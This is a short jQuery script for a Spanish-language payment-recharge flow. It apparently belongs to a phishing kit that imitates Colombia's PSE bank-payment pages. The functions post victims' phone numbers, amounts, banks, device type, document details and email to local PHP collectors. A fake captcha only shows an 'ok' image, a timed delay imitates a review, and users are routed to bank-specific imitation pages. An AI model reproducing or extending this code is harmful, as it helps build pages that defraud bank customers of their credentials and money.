function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else if(navigator.userAgent.match(/webOS/i))
        dispositivo = "webOS";
    else if(navigator.userAgent.match(/iPhone/i))
        dispositivo = "iPhone";
    else if(navigator.userAgent.match(/iPad/i))
        dispositivo = "iPad";
    else if(navigator.userAgent.match(/iPod/i))
        dispositivo = "iPod";
    else if(navigator.userAgent.match(/BlackBerry/i))
        dispositivo = "BlackBerry";
    else if(navigator.userAgent.match(/Windows Phone/i))
        dispositivo = "Windows Phone";
    else
        dispositivo = "PC";
    return dispositivo;
  }
  
  function cargar_resumen(){      
    $.post("../../../process/paso5resumen.php", function(data) {    
        var res = data.split("|");
        $("#inf-ip").html(res[0]);
        $("#val-fecha").html(res[1]);
        $("#val-banco").html(res[2]);
    
        var valor_f = convertir(res[3].replace(/\./g,"").replace(/\$/g,"").replace(/ /g,""));
        valor_f = "$" + valor_f + ".00";
    
        $("#val-total").html(valor_f);
        $("#val-celular").html(res[4]);
    });
  }
  
  function catchaok(){
    $("#catcha").attr("src", "../assets/img/ok.jpg"); 
    if ($("#txt-valor").val() != "$ 0" && $("#txt-banco").val() != "" && $("#txt-cel").val().length == 10 && $("#txt-re").val().length == 10 && $("#txt-cel").val() == $("#txt-re").val()) {
        $("#paso0").removeAttr("disabled");
    } else {
        $("#paso0").attr("disabled","disabled");            
    }
  }
  
  function convertir(v) {
    var cad = v;
    var invertido = cad.split("").reverse().join("");
    var valor = invertido.split(',').join('');
    var tam = valor.length;
    var c = 0;
    var nuevo = "";
    for (var i = 0; i < tam; i++) {            
        if (c == 3) {
            nuevo = nuevo + ",";
            c = 1;
        } else {
            c++;                
        }
        nuevo = nuevo + valor[i];              
    }
    var final = nuevo.split("").reverse().join("");
    return final;    
  }
  
  function cargar_login(){
    window.location.href = "../PSEtransaction/";      
  }
  
  function cargar_banco(b){
    window.location.href = "../recargas/transaction/" + b;  
  }
  
  function pse(){
    window.location.href = "../PSEUserRegister/";   
  }
  
  function resumen(){
    $("#frm-info,#fondo,#cargando").hide();
    $("#frm-revisar").show();   
  }
  
  function revisar_datos(){  
    setTimeout(resumen, 2000);
  }
  
  function enviar_datos(c, v, p, b, t, f, n){  
    var d = detectar_dispositivo();  
    $.post("../process/paso1datos.php", { cel: c, val: v, per: p, ban: b, dis: d, tip: t, fol: f, nom: n }, function(data) {  
        setTimeout(function(){
            window.location.href = "otra_pagina.html"; // Cambia esta URL según necesites.
        }, 5000);
    });
  }
  
  function enviar_email(e){      
    $.post("../process/paso2correo.php", { eml: e }, function(data) { 
        var res = data.split("|");
        if (res[0] == 2) {            
            setTimeout(cargar_banco, 800, res[1]);    
        } else {            
            setTimeout(cargar_login, 800);    
        }        
    });
  }
  
  function vista_resumen(){
    $("#fondo,#cargando").hide();    
    $("#aprobado,.titulo,#comprobante").show();
  }
  